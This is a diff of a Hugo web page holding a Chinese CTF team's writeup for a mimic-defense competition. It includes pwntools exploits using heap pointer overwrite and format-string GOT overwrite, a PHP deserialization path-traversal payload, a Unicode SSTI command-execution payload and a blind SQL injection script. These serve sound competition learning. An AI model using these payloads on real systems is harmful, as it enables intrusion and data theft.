+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="n">BitVec</span><span class="p">(</span><span class="s2">&#34;flag</span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)]</span>
 </span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mh">0x3800</span><span class="o">-</span><span class="mh">0x10000</span><span class="p">)</span><span class="o">&lt;=</span><span class="mh">0x800</span><span class="p">)</span>
@@ -2389,20 +1375,10 @@ check2取最后四位相加比较以及相差验证，password最后的前两位
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;wrong&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#0xc9e8</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#0xcca0</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>考虑大小端序然后代入提取aes的iv和key</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mh">0x4d</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x4d</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span>
+</span></span></code></pre></div><p>考虑大小端序然后代入提取aes的iv和key</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mh">0x4d</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0x4d</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl"><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x8e</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0x81</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0x95</span><span class="p">,</span><span class="mh">0x96</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x8a</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x8c</span><span class="p">,</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>然后aes解密，拼接即可得到flag，注意前面的大写条件
+</span></span></code></pre></div><p>然后aes解密，拼接即可得到flag，注意前面的大写条件
 flag{E8C9A0CC8B9854CDD0AC321B790FC74EFA520FBC}</p>
 <h1 id="mimic">mimic</h1>
 <h2 id="web_mimic">web_mimic</h2>
@@ -2411,54 +1387,7 @@ flag{E8C9A0CC8B9854CDD0AC321B790FC74EFA520FBC}</p>
 <h2 id="pwn2-1">pwn2-1</h2>
 <p>堆块上放了个函数指针，指向print函数，由于程序给出了一个函数地址，直接算一下偏移就可以得到magic函数的地址，然后释放两个控制堆块进入tcache，申请0x10的chunk拿出控制堆块，然后，其中一个chunk的控制堆块就变成了内容堆块，直接改print地址为magic，就可以得到flag
 exp如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn2-1&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;172.51.122.39&#34;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn2-1&#34;</span><span class="p">)</span>
@@ -2501,31 +1430,11 @@ exp如下：</p>
 </span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic_addr</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="pwn1">pwn1</h2>
+</span></span></code></pre></div><h2 id="pwn1">pwn1</h2>
 <p>存在后门函数，并且程序自己泄露了基地址。还有个格式化字符串漏洞。</p>
 <p>利用格式化字符串篡改printf函数的got表为system的地址</p>
 <p>EXP:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tools</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tools</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">libc</span><span class="o">=</span><span class="n">load</span><span class="p">(</span><span class="s2">&#34;./pwn1&#34;</span><span class="p">,</span><span class="s2">&#34;172.51.122.26:9999&#34;</span><span class="p">)</span>
@@ -2539,43 +1448,10 @@ exp如下：</p>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="n">writes</span><span class="o">=</span><span class="p">{</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span><span class="o">+</span><span class="n">base_addr</span><span class="p">:</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="o">+</span><span class="n">base_addr</span><span class="p">})</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="pwn1-1">pwn1-1</h2>
+</span></span></code></pre></div><h2 id="pwn1-1">pwn1-1</h2>
 <p>利用思路:
 这题和pwn1一样，只不过需要多泄露一下程序基地址即可，继续篡改printf的got表为system的plt即可。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tools</span> <span class="kn">import</span><span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tools</span> <span class="kn">import</span><span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">libc</span><span class="o">=</span><span class="n">load</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
@@ -2602,9 +1478,7 @@ exp如下：</p>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span><span class="n">writes</span><span class="o">=</span><span class="p">{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system_addr</span><span class="p">})</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="web">web</h1>
+</span></span></code></pre></div><h1 id="web">web</h1>
 <h2 id="ezus">ezus</h2>
 <p>basename函数绕过读源码
 <code>/index.php/tm.php/是?source</code>
@@ -2616,48 +1490,12 @@ order类的绕过，用cmd://，会把后面的东西当成文件夹解析，就
 <code>username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;password=&quot;;s:8:&quot;password&quot;;O:5:&quot;order&quot;:3:{s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:52:&quot;cmd://prankhub/../../../../../../../../../../../../../../f1111444449999.txt&quot;;}}</code></p>
 <h2 id="没有人比我更懂py">没有人比我更懂py</h2>
 <p>无字母ssti，利用Unicode字符、NFKC，命令执行读flag</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data={{ｕｒｌ_ｆｏｒ.__ｇｌｏｂａｌｓ__.__ｂｕｉｌｔｉｎｓ__[&#39;__ｉｍｐｏｒｔ__&#39;](&#39;ｏｓ&#39;).ｐｏｐｅｎ(&#39;ｃａｔ /ｆｌａｇ&#39;).ｒｅａｄ()}}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="popsql">popsql</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data={{ｕｒｌ_ｆｏｒ.__ｇｌｏｂａｌｓ__.__ｂｕｉｌｔｉｎｓ__[&#39;__ｉｍｐｏｒｔ__&#39;](&#39;ｏｓ&#39;).ｐｏｐｅｎ(&#39;ｃａｔ /ｆｌａｇ&#39;).ｒｅａｄ()}}
+</span></span></code></pre></div><h2 id="popsql">popsql</h2>
 <p>fuzz一下，发现很多关键字都被过滤了，但仔细找找能找到对应代替的函数
 利用benchmark代替sleep可以进行时间盲注
 表名用sys视图来查，字段名可以用sys.statement_analysis来查看操作记录把flag字段名给爆出来</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
 </span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
@@ -2682,9 +1520,7 @@ order类的绕过，用cmd://，会把后面的东西当成文件夹解析，就
 </span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>
 </span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="k">break</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="misc">misc</h1>
+</span></span></code></pre></div><h1 id="misc">misc</h1>
 <h2 id="babymisc">babymisc</h2>
 <p>交互算法题
 手动试了几次，测出来是6位数字
@@ -2693,26 +1529,7 @@ order类的绕过，用cmd://，会把后面的东西当成文件夹解析，就
 二分法手动试了几次，给的次数不够用
 思路：循环交互，随机出一个比较接近999999的数字，再二分法
 （就像roll角色，先随一个较高的天赋值一样）</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">roll</span><span class="p">():</span>
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;Y&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Please enter a number:&#39;</span><span class="p">,</span> <span class="s1">&#39;999000&#39;</span><span class="p">)</span>
@@ -2727,113 +1544,122 @@ order类的绕过，用cmd://，会把后面的东西当成文件夹解析，就
 </span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="black-sheep-wall">Black sheep wall</h2>
+</span></span></code></pre></div><h2 id="black-sheep-wall">Black sheep wall</h2>
 <p>使用010打开后发现是一个wincc工程项目
 使用wincc打开后，发现在vbs 动作1的脚本中发现加密后的flag
 <img src="/img/2022-11-06-NTFY/42.png" alt="">
 猜测在其他场景中包含了密匙或者加密方法，于是导出该项目的所有文本
 发现hint：double&amp;hex，经过搜索后发现double hex即为twice hex加密，最后解密得到flag</p>
 
-        
-          <div class="blog-tags">
+            
+              <div class="blog-tags">
+                
+                  <a href="http://localhost:1313/tags/%E6%8B%9F%E6%80%81/">拟态</a>
+                
+              </div>
+            
+
+            
+
             
               
-              <a href="http://localhost:1313/tags/%E6%8B%9F%E6%80%81/">拟态</a>&nbsp;
-            
-          </div>
-        
+                
+              
 
-        
-
-        
-          
-            
-          
-
-          
+              
+                <section class="article-related">
                   <h4 class="see-also">See also</h4>
                   <ul>
-                
-                
-                    <li><a href="/post/ntfy-2025-su-wu/">第八届“强网”拟态防御国际精英挑战赛 SU Writeup</a></li>
-                
-                    <li><a href="/post/ntfy-2021-su-wu/">第四届“强网”拟态防御国际精英挑战赛 SU Write-Up</a></li>
-                
-              </ul>
+                    
+                    
+                      <li><a href="/post/ntfy-2025-su-wu/">第八届“强网”拟态防御国际精英挑战赛 SU Writeup</a></li>
+                    
+                      <li><a href="/post/ntfy-2021-su-wu/">第四届“强网”拟态防御国际精英挑战赛 SU Write-Up</a></li>
+                    
+                  </ul>
+                </section>
+              
+            
+          </article>
+        </section>
 
-          
         
-      </article>
+          <ul class="pager blog-pager">
+            
+              <li class="previous">
+                <a href="/post/xyb-2022-su-wu/" data-toggle="tooltip" data-placement="top" title="2022 祥云杯 SU Writeup">&larr; Previous Post</a>
+              </li>
+            
+            
+              <li class="next">
+                <a href="/post/rwctf-2023-su-wu/" data-toggle="tooltip" data-placement="top" title="2023 RWCTF体验赛 SU Writeup">Next Post &rarr;</a>
+              </li>
+            
+          </ul>
+        
 
-      
-        <ul class="pager blog-pager">
-          
-            <li class="previous">
-              <a href="http://localhost:1313/post/xyb-2022-su-wu/" data-toggle="tooltip" data-placement="top" title="2022 祥云杯 SU Writeup">&larr; Previous Post</a>
-            </li>
-          
-          
-            <li class="next">
-              <a href="http://localhost:1313/post/rwctf-2023-su-wu/" data-toggle="tooltip" data-placement="top" title="2023 RWCTF体验赛 SU Writeup">Next Post &rarr;</a>
-            </li>
-          
-        </ul>
-      
-
-
-      
-
-    </div>
+        
+      </div>
   </div>
 </div>
 
-      <footer>
+      <footer class="site-footer">
   <div class="container">
     
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <ul class="list-inline text-center footer-links">
+
+    <div class="site-footer__grid">
+      <div class="site-footer__brand">
+        <p class="site-footer__eyebrow">SU TEAM // BATTLE LOG</p>
+        <h2 class="site-footer__title">su-team</h2>
+        <p class="site-footer__tagline">
+          Built for team archives and competition writeups.
+          
+            <span class="site-footer__subline">Minimal noise, high signal, and fast navigation.</span>
+          
+        </p>
+      </div>
+
+      <div class="site-footer__meta">
+        <ul class="list-inline footer-links">
           
               <li>
                 
-		  <a href="https://ctftime.org/team/29641" title="CTFTime">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <img src="http://localhost:1313/img/ctftime.svg" title="CTFTime" alt="CTFTime" style="width:60%;height:60%;position:absolute;top:20%;left:20%">
-                    
-                  </span>
-                </a>
+                  <a href="https://ctftime.org/team/29641" title="CTFTime">
+                
+                    <span class="footer-link__icon">
+                      
+                        
+                          <img class="footer-social-img" src="/img/ctftime.svg" title="CTFTime" alt="CTFTime">
+                        
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="mailto:suers_xctf@126.com" title="Email me">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="mailto:suers_xctf@126.com" title="Email me">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fas fa-envelope" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
               <li>
                 
-		  <a href="https://github.com/team-su" title="GitHub">
-		
-                  <span class="fa-stack fa-lg">
-                    <i class="fas fa-circle fa-stack-2x"></i>
-                    
-                      <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                    
-                  </span>
-                </a>
+                  <a href="https://github.com/team-su" title="GitHub">
+                
+                    <span class="footer-link__icon">
+                      
+                        <i class="fab fa-github" aria-hidden="true"></i>
+                      
+                    </span>
+                  </a>
               </li>
           
         </ul>
+
         <p class="credits copyright text-muted">
           
             
@@ -2848,10 +1674,10 @@ order类的绕过，用cmd://，会把后面的东西当成文件夹解析，就
 
           
             &nbsp;&bull;&nbsp;
-            <a href="http://localhost:1313/">su-team</a>
+            <a href="/">su-team</a>
           
         </p>
-        
+
         <p class="credits theme-by text-muted">
           <a href="https://gohugo.io">Hugo v0.157.0</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
           
@@ -2882,8 +1708,6 @@ order类的绕过，用cmd://，会把后面的东西当成文件夹解析，就
 
 <script src="http://localhost:1313/js/main.js"></script><script src="http://localhost:1313/js/photoswipe.min.js"></script>
 <script src="http://localhost:1313/js/photoswipe-ui-default.min.js"></script><script src="http://localhost:1313/js/load-photoswipe.js"></script>
-
-
 
 
 
